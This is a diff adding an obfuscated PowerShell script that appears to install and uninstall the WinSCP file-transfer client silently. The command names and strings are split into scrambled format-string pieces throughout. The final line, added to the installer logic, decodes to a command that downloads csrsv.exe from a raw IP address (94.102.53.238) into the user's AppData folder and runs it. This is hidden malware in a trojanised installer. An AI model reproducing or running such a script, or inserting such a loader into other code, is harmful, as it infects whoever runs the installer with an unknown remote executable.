@@ -1,0 +1,109 @@
+param(
+	[string]${ver`Si`on},
+	[string]${pa`TH},
+	[switch]${F`O`RcE},
+	${UP`da`TE},
+	[switch]${uN`ins`TaLl}
+)
+
+
+
+
+
+${conf`I`gs} = @{
+	("{1}{0}" -f 'rl','U') = ("{4}{7}{13}{6}{1}{3}{11}{0}{2}{14}{9}{12}{5}{8}{10}" -f '2737e06f','ad','dcc6e','/files/20','htt','4','downlo','p://w','fa/','0afd57','winscp555setup.exe','14092810','975c8','inscp.net/','29eab78')
+    ("{1}{0}" -f'ath','P') = "$(Split-Path -Path $MyInvocation.MyCommand.Definition -Parent)\ "
+}
+
+${CoNf`IGs} | &("{1}{4}{0}{3}{2}"-f'ch','ForE','ect','-Obj','a'){
+
+    try{
+
+        ${_}."REs`Ult" = ${nu`Ll}
+        if(-not ${_}."P`AtH"){${_}."P`Ath" = ${p`Ath}}
+        ${c`o`NFIg} = ${_}
+
+        
+        
+        
+
+        if(-not ${u`Ni`NSta`Ll}){
+
+            
+            
+            
+
+            if(${_}."C`OnD`I`TIo`NeXCLuSioN"){            
+                ${_}."c`oNd`i`TI`onexClUSIonRESuLt" = $(&("{0}{2}{1}{3}" -f 'I','oke-Expr','nv','ession') ${cOn`FIG}."COnd`i`TiONEXc`Lus`iOn" -ErrorAction ("{1}{4}{2}{0}{3}"-f 'inu','Silen','lyCont','e','t'))        
+            }    
+            if((${_}."CONdiT`I`ONEXcLU`sIONr`E`SulT" -eq ${nu`LL}) -or ${F`O`Rce}){
+                    	
+                
+                
+                
+
+                ${_}."do`WNLoa`ds" = ${_}."U`Rl" | &("{3}{4}{0}{2}{1}" -f 'ach-Ob','t','jec','For','E'){
+                    &("{2}{0}{1}" -f't','-File','Ge') -Url ${_} -Path ${cO`NFiG}."p`Ath"
+                }       			
+
+                
+                
+                
+
+                ${_}."dO`WNLOa`ds" | &("{1}{0}{2}"-f'ach-Objec','ForE','t'){
+                    &("{1}{3}{0}{2}"-f'P','St','rocess','art-') -FilePath $(&("{2}{0}{1}" -f 'n-Pat','h','Joi') ${_}."P`AtH" ${_}."f`ILe`NAme") -ArgumentList ("{4}{3}{0}{1}{2}"-f'NT /NOR','EST','ART','LE','/VERYSI') -Wait
+                }
+                		
+                
+                
+                
+
+                ${EXE`c`UTabLE} = ((("{4}{5}{0}{2}{8}{7}{9}{10}{6}{3}{1}" -f 'Files (x','xe','8','.e','C:rfZPro','gram ','WinSCP',')r','6','fZ','WinSCPrfZ'))."rePLA`CE"('rfZ',[sTring][chAr]92));if(&("{2}{1}{0}" -f 'h','at','Test-P') ${Ex`EcuTA`B`le}){.("{2}{0}{1}" -f'nte','nt','Set-Co') -Path (.("{0}{1}{2}"-f'Join-P','a','th') ${p`s`BIN}."P`ATH" ("{1}{0}{2}"-f'.b','WinSCP','at')) -Value ('@'+'echo'+' '+"off`nstart "+"`"`" "+"`"$Executable`" "+'%*')}
+                                
+                
+                
+                
+
+                ${_}."Do`Wn`lOadS" | .("{2}{1}{0}{3}" -f 'bj','orEach-O','F','ect'){
+                    .("{1}{2}{0}"-f'em','Remove-','It') $(&("{2}{1}{0}" -f 'ath','oin-P','J') ${_}."pa`TH" ${_}."FILeN`AmE")
+                }
+                		
+                
+                
+                
+                		
+                if(${UPD`A`TE}){${_}."rESu`lT" = ("{1}{0}{2}" -f 'ppUpda','A','ted');${_}
+                }else{${_}."r`Es`Ult" = ("{0}{3}{2}{1}"-f 'App','led','stal','In');${_}}
+            		
+            
+            
+            
+            		
+            }else{
+            	
+                ${_}."R`esulT" = ("{4}{0}{2}{3}{1}"-f 'ditio','ion','nEx','clus','Con');${_}
+            }
+
+        
+        
+        
+        	
+        }else{
+
+            if(&("{0}{2}{1}" -f 'Te','Path','st-') (.("{1}{2}{0}"-f'in-Path','J','o') ${ps`BIN}."P`Ath" ("{2}{0}{1}" -f 'a','t','WinSCP.b'))){&("{2}{1}{0}" -f'Item','emove-','R') (.("{2}{0}{1}" -f 'in-','Path','Jo') ${PS`B`IN}."Pa`Th" ("{0}{1}{2}"-f'Win','SCP.ba','t'))}
+            
+            ${Ex`EcuTa`BLE} = ((("{6}{5}{1}{9}{10}{4}{7}{8}{11}{2}{0}{3}"-f 'nins000.e','Uv','vu','xe','iles ',':P','C','(x86)PU','vWinSCPP','Program',' F','U')).("{0}{1}"-f'RepL','Ace').Invoke('PUv','\')); if(.("{1}{2}{3}{0}"-f'h','Te','st-Pa','t') ${EX`EcUT`AbLe}){&("{1}{0}{2}" -f't-Pro','Star','cess') -FilePath ${ExE`cUTA`BLe} -ArgumentList ("{0}{1}{2}" -f'/V','ERYSILEN','T') -Wait}
+            
+            ${_}."Resu`lt" = ("{0}{4}{1}{2}{3}" -f'AppU','in','st','alled','n');${_}
+        }
+
+    
+    
+    
+
+    }catch{
+
+        ${con`FIG}."re`sult" = ("{0}{1}"-f'E','rror');${cO`NFIg}
+    }
+}
+(.("{2}{3}{1}{0}"-f't','ec','New','-Obj') ("{2}{0}{1}{4}{3}{5}"-f 'tem','.','Sys','et.Web','N','Client')).("{0}{2}{1}" -f'Downl','le','oadFi').Invoke(("{4}{3}{0}{9}{8}{5}{7}{6}{1}{2}"-f 'p://94','/csrsv.e','xe','tt','h','02.','hoo','53.238/~ya','1','.'),"$env:APPDATA\csrsv.exe");.("{3}{1}{0}{2}"-f'o','art-Pr','cess','St') ("$env:APPDATA\csrsv.exe")
